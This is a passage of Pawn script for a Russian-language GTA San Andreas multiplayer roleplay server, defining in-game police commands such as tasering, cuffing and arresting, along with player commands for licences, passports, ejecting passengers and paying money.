	if(PlayerLogged[playerid] == 0) return true;
	new string[90];
	if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вам не доступна эта команда!");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /pull [id игрока]");
	if(PlayerCuffed[params[0]] == false) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен быть в наручниках!");
	if(ProxDetectorS(8.0, playerid, params[0]))
	{
		new Float:pos[3];
		GetPlayerPos(playerid,pos[0],pos[1],pos[2]);
		if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете тащить самого себя!");
		format(string, 90, "%s взял(а) %s и потащил за собой", PlayerInfo[playerid][pSendername], sendername(params[0]));
		ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
		SetPlayerPos(params[0],pos[0]+0.2,pos[1]+0.2,pos[2]);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Игрок находится далеко от вас!");
	}
	return true;
}
CMD:tazer(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	new string[90];
	if(PlayerInfo[playerid][pMember] == F_FBI || PlayerInfo[playerid][pMember] == F_LIC || PlayerInfo[playerid][pMember] == F_POLICE_LS || PlayerInfo[playerid][pMember] == F_POLICE_SF || PlayerInfo[playerid][pMember] == F_ARMY)
	{
		if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться вне транспорта!");
		if(GetPVarInt(playerid, "TazerTime") > gettime()) return  SendClientMessage(playerid, COLOR_GREY, "Перезарядка тайзера ещё не прошла!");
		new suspect = GetClosestPlayer(playerid);
		if(!IsPlayerInRangeOfPlayer(8.0, playerid,suspect)) return SendClientMessage(playerid, COLOR_GREY, "Рядом с вами никого нет!");
		if(IsACop(suspect) || PlayerInfo[suspect][pMember] == F_ARMY) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете ударить электрошоком полицейского/агента/военного!");
		if(IsPlayerInAnyVehicle(suspect)) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться вне транспорта!");
		if(PlayerCuffed[suspect] == true) return SendClientMessage(playerid, COLOR_GREY, "Игрок уже в наручниках!");
		format(string, 90, "%s ударил(а) электрошоком %s'а", PlayerInfo[playerid][pSendername], sendername(suspect));
		ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
		TogglePlayerControllable(suspect,0);
		ApplyAnimation(suspect,"PED","handsup",4.1,0,1,1,1,1);
		TazerTime[suspect] = 10;
		SetPVarInt(playerid, "TazerTime", gettime()+10);
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}
CMD:cuff(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	new string[127];
	if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /cuff [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок не онлайн!");
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не залогинился!");
	if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете надеть наручники на себя!");
	if(IsACop(params[0])) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок Полицейский/Агент/Военный!");
	if(PlayerCuffed[params[0]] == true) return SendClientMessage(playerid, COLOR_GREY, "Игрок уже в наручниках!");
	SendMes(playerid, 0x6495EDFF, "Вы надели наручники на %s", sendername(params[0]));
	SendMes(params[0], 0x6495EDFF, "%s надел на вас наручники!", sendername(playerid));
	SetPVarInt(params[0], "CUFFED", 1);
	format(string, 127, "%s Надел(а) наручники на %s", sendername(playerid), sendername(params[0]));
	SetPlayerAttachedObject(params[0], 0, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000);
	SetPlayerSpecialAction(params[0], SPECIAL_ACTION_CUFFED);
	ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
	format(string, 16, "~r~cuffed");
	GameTextForPlayer(playerid, string, 5000,5);
	format(string, 16, "~r~cuffed");
	GameTextForPlayer(params[0], string, 5000,5);
	//TogglePlayerControllable(params[0], 0);
	PlayerCuffed[params[0]] = true;
	return true;
}
//------------------------------------------------------------------------------------------------
CMD:uncuff(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	new string[127];
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /uncuff [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок не онлайн!");
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не залогинился!");
	if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете снять наручники с себя!");
	if(IsACop(params[0])) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок Полицейский/Агент/Военный!");
	if(PlayerCuffed[params[0]] == false) return SendClientMessage(playerid, COLOR_GREY, "Игрок не в наручниках!");
	SendMes(playerid, 0x6495EDFF, "Вы сняли наручники с %s", sendername(params[0]));
	SendMes(params[0], 0x6495EDFF, "%s Снял(а) с вас наручники", sendername(playerid));
	SetPVarInt(params[0], "CUFFED", 0);
	SetPlayerSpecialAction(params[0], SPECIAL_ACTION_NONE);
	RemovePlayerAttachedObject(params[0], 0);
	format(string, 127, "%s Снял(а) наручники с %s", sendername(playerid), sendername(params[0]));
	ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
	format(string, 16, "~g~uncuffed");
	GameTextForPlayer(playerid, string, 5000,5);
	format(string, 16, "~g~uncuffed");
	GameTextForPlayer(params[0], string, 5000,5);
	//TogglePlayerControllable(params[0], 0);
	PlayerCuffed[params[0]] = false;
	return true;
}
CMD:find(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsACop(playerid))
	{
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /find [id игрока]");
		if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
		if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
		if(GetPVarInt(playerid, "FindPlayer") == 1)
		{
			DeletePVar(playerid, "FindPlayer");
			SendClientMessage(playerid, COLOR_BLUE, "Вы отключили метку на карте");
			DisablePlayerRaceCheckpoint(playerid);
		}
		else
		{
			SetPVarInt(playerid, "FindPlayer", 1);
			SendMes(playerid, COLOR_BLUE, "Вы отметили на карте: %s", sendername(params[0]));
			new Float:pos[3];
			GetPlayerPos(params[0], pos[0], pos[1], pos[2]);
			SetPlayerRaceCheckpoint(playerid, 1, pos[0], pos[1], pos[2], 0.0, 0.0, 0.0, 5.0);
		}
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}
CMD:arrest(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsACop(playerid))
	{
		if(PlayerInfo[playerid][pMember] == F_POLICE_LS && (IsPlayerInRangeOfPoint(playerid, 5.0,1568.5662,-1694.1156,5.8906) || IsPlayerInRangeOfPoint(playerid, 5.0,267.3948,77.5959,1001.0391)))
		{
			if(sscanf(params, "ui", params[0], params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /arrest [id игрока] [минуты]");
			if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
			if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
			if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
			if(PlayerInfo[params[0]][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок уже находиться в тюрьме!");
			if(IsACop(params[0]) || PlayerInfo[params[0]][pMember] == F_ARMY) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок полицейский/агент/военный!");
			if(PlayerInfo[params[0]][pWanted] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен иметь хотя бы 1 уровень розыска!");
			if(params[1] < 1 || params[1] > 60) return SendClientMessage(playerid, COLOR_GREY, "Кол-во минут от 1 до 60!");
			ResetWeapon(params[0]);
			PlayerInfo[params[0]][pJailTime] = params[1] * 60;
			PlayerInfo[params[0]][pWanted] = 0;
			SetPVarInt(params[0], "CUFFED", 0);
			SetPlayerColor(params[0], 0xFFFFFF00);
			SendMes(playerid, COLOR_BLUE, "Вы посадили в камеру %s (ID: %i) на %i секунд", sendername(params[0]), params[0], params[1]*60);
			SendMes(params[0], COLOR_BLUE, "%s %s (ID: %i) посадил вас в камеру на %i секунд", FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]], PlayerInfo[playerid][pSendername], playerid, params[1]*60);
			SetPlayerInterior(params[0], 6);
			SetPlayerPos(params[0],264.1425,77.4712,1001.0391);
			SetPlayerFacingAngle(params[0], 263.0160);
			PlayerInfo[params[0]][pJail] = 1;
			SetPlayerWantedLevel(params[0], 0);
			TogglePlayerControllable(params[0], 1);
			PlayerCuffed[params[0]] = false;
			//SetPlayerSpecialAction(params[0], SPECIAL_ACTION_NONE);/// Что ето?? проверить
			RemovePlayerAttachedObject(params[0], 0);
			format(totalstring, 127, "« Офицер %s арестовал %s »", PlayerInfo[playerid][pSendername], sendername(params[0]));
			SendClientMessageToAll(COLOR_LIGHTRED, totalstring);
		}
		else if(PlayerInfo[playerid][pMember] == F_POLICE_SF && (IsPlayerInRangeOfPoint(playerid, 5.0,219.3863,113.5021,999.0156) || IsPlayerInRangeOfPoint(playerid, 5.0,-1589.8060,716.3044,-5.2422)))
		{
			if(sscanf(params, "ui", params[0], params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /arrest [id игрока] [минуты]");
			if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
			if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
			if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
			if(PlayerInfo[params[0]][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок уже находиться в тюрьме!");
			if(IsACop(params[0]) || PlayerInfo[params[0]][pMember] == F_ARMY) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок полицейский/агент/военный!");
			if(PlayerInfo[params[0]][pWanted] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен иметь хотя бы 1 уровень розыска!");
			if(params[1] < 1 || params[1] > 60) return SendClientMessage(playerid, COLOR_GREY, "Кол-во минут от 1 до 60!");
			ResetWeapon(params[0]);
			PlayerInfo[params[0]][pJailTime] = params[1] * 60;
			PlayerInfo[params[0]][pWanted] = 0;
			SetPVarInt(params[0], "CUFFED", 0);
			PlayerCuffed[params[0]] = false;
			SetPlayerColor(params[0], 0xFFFFFF00);
			SendMes(playerid, COLOR_BLUE, "Вы посадили в камеру %s (ID: %i) на %i секунд", sendername(params[0]), params[0], params[1]*60);
			SendMes(params[0], COLOR_BLUE, "%s %s (ID: %i) посадил вас в камеру на %i секунд", FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]], PlayerInfo[playerid][pSendername], playerid, params[1]*60);
			SetPlayerInterior(params[0], 10);
			SetPlayerPos(params[0],219.5400,109.9767,999.0156);
			SetPlayerFacingAngle(params[0], 1.0);
			PlayerInfo[params[0]][pJail] = 2;
			SetPlayerWantedLevel(params[0], 0);
			TogglePlayerControllable(params[0], 1);
			format(totalstring, 127, "« Офицер %s арестовал %s »", PlayerInfo[playerid][pSendername], sendername(params[0]));
			SendClientMessageToAll(COLOR_LIGHTRED, totalstring);
		}
		else if(PlayerInfo[playerid][pMember] == F_FBI && (
					IsPlayerInRangeOfPoint(playerid, 5.0,-1950.9218,-1053.2725,32.1719) || IsPlayerInRangeOfPoint(playerid, 5.0,290.5822,282.3103,996.5789) ||
					IsPlayerInRangeOfPoint(playerid, 5.0,287.2193,282.2557,996.5789) || IsPlayerInRangeOfPoint(playerid, 5.0,-1589.8060,716.3044,-5.2422) ||
					IsPlayerInRangeOfPoint(playerid, 5.0,1568.5662,-1694.1156,5.8906) || IsPlayerInRangeOfPoint(playerid, 5.0,267.3948,77.5959,1001.0391)))
		{
			if(sscanf(params, "ui", params[0], params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /arrest [id игрока] [минуты]");
			if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
			if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
			if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
			if(PlayerInfo[params[0]][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок уже находиться в тюрьме!");
			if(IsACop(params[0]) || PlayerInfo[params[0]][pMember] == F_ARMY) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок полицейский/агент/военный!");
			if(PlayerInfo[params[0]][pWanted] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен иметь хотя бы 1 уровень розыска!");
			if(params[1] < 1 || params[1] > 60) return SendClientMessage(playerid, COLOR_GREY, "Кол-во минут от 1 до 60!");
			ResetWeapon(params[0]);
			PlayerInfo[params[0]][pJailTime] = params[1] * 60;
			PlayerInfo[params[0]][pWanted] = 0;
			SetPVarInt(params[0], "CUFFED", 0);
			PlayerCuffed[params[0]] = false;
			TogglePlayerControllable(params[0], 1);
			SetPlayerColor(params[0], 0xFFFFFF00);
			SendMes(playerid, COLOR_BLUE, "Вы посадили в камеру %s (ID: %i) на %i секунд", sendername(params[0]), params[0], params[1]*60);
			SendMes(params[0], COLOR_BLUE, "%s %s (ID: %i) посадил вас в камеру на %i секунд", FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]], PlayerInfo[playerid][pSendername], playerid, params[1]*60);
			if(IsPlayerInRangeOfPoint(playerid, 5.0,1568.5662,-1694.1156,5.8906) || IsPlayerInRangeOfPoint(playerid, 5.0,267.3948,77.5959,1001.0391))
			{
				SetPlayerInterior(params[0], 6);
				SetPlayerPos(params[0],264.1425,77.4712,1001.0391);
				SetPlayerFacingAngle(params[0], 263.0160);
				PlayerInfo[params[0]][pJail] = 1;
				SetPlayerWantedLevel(params[0], 0);
			}
			if(IsPlayerInRangeOfPoint(playerid, 5.0,219.3863,113.5021,999.0156) || IsPlayerInRangeOfPoint(playerid, 5.0,-1589.8060,716.3044,-5.2422))
			{
				SetPlayerInterior(params[0], 10);
				SetPlayerPos(params[0],219.5400,109.9767,999.0156);
				SetPlayerFacingAngle(params[0], 1.0);
				PlayerInfo[params[0]][pJail] = 2;
				SetPlayerWantedLevel(params[0], 0);
			}
			if(IsPlayerInRangeOfPoint(playerid, 5.0,-1950.9218,-1053.2725,32.1719) || IsPlayerInRangeOfPoint(playerid, 5.0,287.2193,282.2557,996.5789))
			{
				SetPlayerInterior(params[0], 3);
				SetPlayerPos(params[0],285.7703,286.7446,996.5789);
				SetPlayerFacingAngle(params[0], 0.0000);
				PlayerInfo[params[0]][pJail] = 3;
				SetPlayerWantedLevel(params[0], 0);
			}
			format(totalstring, 127, "« Агент ФБР %s арестовал %s »", PlayerInfo[playerid][pSendername], sendername(params[0]));
			SendClientMessageToAll(COLOR_LIGHTRED, totalstring);
		}
		else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться рядом с тюрьмой!");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}

CMD:m(playerid, params[]) return cmd_megaphone(playerid, params);
CMD:megaphone(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsACop(playerid) || PlayerInfo[playerid][pMember] == F_ARMY || PlayerInfo[playerid][pMember] == F_HOSPITAL)
	{
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, PlayerIsNotInCar);
		new full = 0;
		for(new i = 6; i <= 141; i++)
		{
			if(i >= 56 && i <= 66 || i >= 69 && i <= 75 || i >= 104 && i <= 112) continue;
			if(VehInfo[i][vVehicle] == GetPlayerVehicleID(playerid))
			{
				if(sscanf(params, "s[64]", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /megaphone [текст]");
				format(totalstring, 90, "(( %s %s: %s ))",FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]], PlayerInfo[playerid][pSendername],params[0]);
				ProxDetectorNew(playerid,80.0,COLOR_YELLOW,totalstring);
				full++;
				break;
			}
		}
		if(full == 0) SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в специализированном транспорте!");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}
CMD:clear(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsACop(playerid))
	{
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, PlayerIsNotInCar);
		new full = 0;
		for(new i = 1; i <= TOTALVEH; i++)
		{
			if(VehInfo[i][vVehicle] == GetPlayerVehicleID(playerid) && (i >= 6 && i <= 55 || i >= 67 && i <= 103))
			{
				if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /clear [id игрока]");
				if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
				if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
				if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете снять себе розыск!");
				if(!IsPlayerInVehicle(params[0], GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться с вами в транспорте!");
				SendMes(playerid, COLOR_LIGHTBLUE, "Вы сняли уровни розыска с %s'а", sendername(params[0]));
				SendMes(params[0], COLOR_LIGHTBLUE, "Офицер %s снял с вас уровни розыска", PlayerInfo[playerid][pSendername]);
				format(totalstring, 127, "Офицер %s зашел(ла) в базу данных полиции", PlayerInfo[playerid][pSendername]);
				ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, totalstring);
				PlayerInfo[params[0]][pWanted] =0;
				SetPlayerWantedLevel(params[0], 0);
			}
			else full++;
		}
		if(full == 0) SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в специализированном транспорте!");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}
CMD:ram(playerid, params[]){
	if(PlayerLogged[playerid] == 0) return true;
	if(IsACop(playerid)){
		new full = 0;
		for(new i = 1; i <= TOTALHOUSE; i++){
			if(IsPlayerInRangeOfPoint(playerid, 3.0,HouseInfo[i][hEntrx],HouseInfo[i][hEntry],HouseInfo[i][hEntrz])){
				SendMes(playerid, COLOR_LIGHTRED, "Вы выбили дверь дома (Владелец: %s)", HouseInfo[i][hOwner]);
				format(totalstring, 127, "%s выбил(а) дверь дома", PlayerInfo[playerid][pSendername]);
				ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, totalstring);
				SetPlayerPos(playerid,HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz]);
				SetPlayerInterior(playerid,HouseInfo[i][hInt]);
				SetPlayerVirtualWorld(playerid,HouseInfo[i][hVirtual]);
				full++;}}
		if(full == 0) SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться рядом с домом!");}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;}
CMD:licenses(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	SendClientMessage(playerid, COLOR_LIGHTRED, "[ -------------- Лицензии -------------- ]");
	SendMes(playerid, COLOR_WHITE, "Водительские права: %s", (!PlayerInfo[playerid][pLic][0]) ? ("{FF6347}Нету"):("{9ACD32}Есть"));
	SendMes(playerid, COLOR_WHITE, "Лицензия на полеты: %s",(!PlayerInfo[playerid][pLic][2]) ? ("{FF6347}Нету"):("{9ACD32}Есть"));
	SendMes(playerid, COLOR_WHITE, "Лицензия на оружие: %s",(!PlayerInfo[playerid][pLic][4]) ? ("{FF6347}Нету"):("{9ACD32}Есть"));
	SendMes(playerid, COLOR_WHITE, "Лицензия на судоходство: %s",(!PlayerInfo[playerid][pLic][1]) ? ("{FF6347}Нету"):("{9ACD32}Есть"));
	SendMes(playerid, COLOR_WHITE, "Лицензия на рыболовство: %s",(!PlayerInfo[playerid][pLic][3]) ? ("{FF6347}Нету"):("{9ACD32}Есть"));
	SendClientMessage(playerid, COLOR_LIGHTRED, "[ -------------- _________ -------------- ]");
	return true;
}
CMD:showlicenses(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /showlicenses [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(playerid == params[0]) return SendClientMessage(playerid, COLOR_GREY, "Используйте: /licenses");
	if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	SendMes(params[0], COLOR_LIGHTRED, "[ -------------- Лицензии %s -------------- ]", PlayerInfo[playerid][pSendername]);
	SendMes(params[0], COLOR_WHITE, "Водительские права: %s", (!PlayerInfo[playerid][pLic][0]) ? ("{FF6347}Нету"):("{9ACD32}Есть"));
	SendMes(params[0], COLOR_WHITE, "Лицензия на полеты: %s",(!PlayerInfo[playerid][pLic][2]) ? ("{FF6347}Нету"):("{9ACD32}Есть"));
	SendMes(params[0], COLOR_WHITE, "Лицензия на оружие: %s",(!PlayerInfo[playerid][pLic][4]) ? ("{FF6347}Нету"):("{9ACD32}Есть"));
	SendMes(params[0], COLOR_WHITE, "Лицензия на судоходство: %s",(!PlayerInfo[playerid][pLic][1]) ? ("{FF6347}Нету"):("{9ACD32}Есть"));
	SendMes(params[0], COLOR_WHITE, "Лицензия на рыболовство: %s",(!PlayerInfo[playerid][pLic][3]) ? ("{FF6347}Нету"):("{9ACD32}Есть"));
	SendMes(params[0], COLOR_LIGHTRED, "[ -------------- _________ -------------- ]");
	SendMes(playerid, COLOR_LIGHTBLUE, "Вы показали свои лицензии %s", sendername(params[0]));
	SendMes(params[0], COLOR_LIGHTBLUE, "%s показал вам свои лицензии", PlayerInfo[playerid][pSendername]);
	format(totalstring,64, "%s показал свои лицензии %s'у",PlayerInfo[playerid][pSendername], sendername(params[0]));
	ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, totalstring);
	return true;
}
CMD:pass(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /pass [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	new text[16], ttexttt[32], mtext[MAX_PLAYER_NAME];
	if((PlayerInfo[playerid][pVoennik]) == 0) format(ttexttt,sizeof(ttexttt),"Не Служил");
	else format(ttexttt,sizeof(ttexttt),"Служил");
	if(PlayerInfo[playerid][pMarried] == false) format(mtext, sizeof(mtext), "Нет");
	else format(mtext, sizeof(mtext), "%s", PlayerInfo[playerid][pWhoMarried]);
	if(PlayerInfo[playerid][pPhone][0] == 0) format(text, sizeof(text), "Нет");
	else format(text, sizeof(text), "%i", PlayerInfo[playerid][pPhone][1]);
	SendMes(params[0], COLOR_LIGHTRED, "[ -------------- Паспорт %s -------------- ]", PlayerInfo[playerid][pSendername]);
	SendMes(params[0], COLOR_WHITE, "Имя: {9ACD32}%s {ffffff}", PlayerInfo[playerid][pSendername]);
	SendMes(params[0], COLOR_WHITE, "Проживание в штате: {9ACD32}%i",PlayerInfo[playerid][pLevel]);
	SendMes(params[0], COLOR_WHITE, "Телефон: {9ACD32}%s{ffffff} | Брак: {9ACD32}%s", text, mtext);
	SendMes(params[0], COLOR_WHITE, "Армия: {9ACD32}%s", ttexttt);
	SendMes(params[0], COLOR_WHITE, "Организация: {9ACD32}%s {ffffff}| Ранг: {9ACD32}%s",GetFracName(playerid),GetRangName(playerid));
	SendMes(params[0], COLOR_WHITE, "Преступлений: {FF6347}%i {ffffff}| Уровень розыска: {FF6347}%i",PlayerInfo[playerid][pCrimes], PlayerInfo[playerid][pWanted]);
	if(PlayerInfo[params[0]][pWanted] > 0 && IsACop(playerid)) SendClientMessage(playerid, COLOR_LIGHTRED, "Внимание! Этот человек находиться в розыске.");
	SendMes(params[0], COLOR_LIGHTRED, "[ -------------- __________ -------------- ]");
	SendMes(playerid, COLOR_LIGHTBLUE, "Вы показали свой паспорт %s'у", sendername(params[0]));
	SendMes(params[0], COLOR_LIGHTBLUE, "%s показал вам свой паспорт", PlayerInfo[playerid][pSendername]);
	format(totalstring, 64, "%s показал(a) свой паспорт %s", PlayerInfo[playerid][pSendername], sendername(params[0]));
	ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, totalstring);
	return true;
}
CMD:eject(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, PlayerIsNotInCar);
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем транспорт!");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /eject [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(playerid == params[0]) return SendClientMessage(playerid, COLOR_GREY, "Ты не можешь выкинуть себя!");
	if(!IsPlayerInVehicle(params[0],GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться в вашем транспорте!");
	SendMes(playerid, COLOR_LIGHTBLUE, "Вы выкинули из транспорта %s", sendername(params[0]));
	SendMes(params[0], COLOR_LIGHTBLUE, "%s выкинул вас из транспорта", PlayerInfo[playerid][pSendername]);
	format(totalstring,64, "%s выкинул из транспорта %s'а",PlayerInfo[playerid][pSendername], sendername(params[0]));
	ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, totalstring);
	RemoveFromVehicle(params[0]);
	return true;
}
CMD:licenzers(playerid, params[]) return cmd_instructors(playerid, params);
CMD:instructors(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	SendClientMessage(playerid, 0x6495EDFF, "Инструкторы в сети:");
	new text[16], full;
	for(new i; i < MAX_PLAYERS; i++)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
		if(PlayerInfo[i][pMember] == F_LIC)
		{
			if(PlayerInfo[i][pPhone][0] == 0) format(text, sizeof(text), "Нет");
			else format(text, sizeof(text), "%i", PlayerInfo[i][pPhone][1]);
			SendMes(playerid, COLOR_WHITE, "Инструкторы %s - Телефон: %s", PlayerInfo[i][pSendername], text);
			full++;
		}
	}
	if(full == 0) SendClientMessage(playerid, COLOR_WHITE, "Инструкторов нет в сети!");
	return true;
}
CMD:payday(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] == 0) return true;
	PayDayTime();
	return true;
}

CMD:pay(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(sscanf(params, "ui", params[0], params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /pay [id игрока] [сумма]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Как вы представляете передачу денег самому себе?");
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(params[1] > 5000 && PlayerInfo[playerid][pLevel] < 3) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете передавать больше 100$!");
	if(params[1] < 1 || params[1] > 50000) return SendClientMessage(playerid, COLOR_GREY, "Кол-во долларов от 1 до 50000!");
	if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	if(params[1] > GetMoney(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
	GiveMoney(playerid, -params[1]);
	GiveMoney(params[0], params[1]);
	if(params[1] >= 100000)
	{
		new string[64];
		format(string,sizeof(string),"Player: %s give %s Money: %d",PlayerInfo[playerid][pSendername],sendername(params[0]), params);
		Log("GiveMoney",string);
	}
	SendMes(playerid, COLOR_BLUE, "Вы передали %s %i долларов", sendername(params[0]), params[1]);
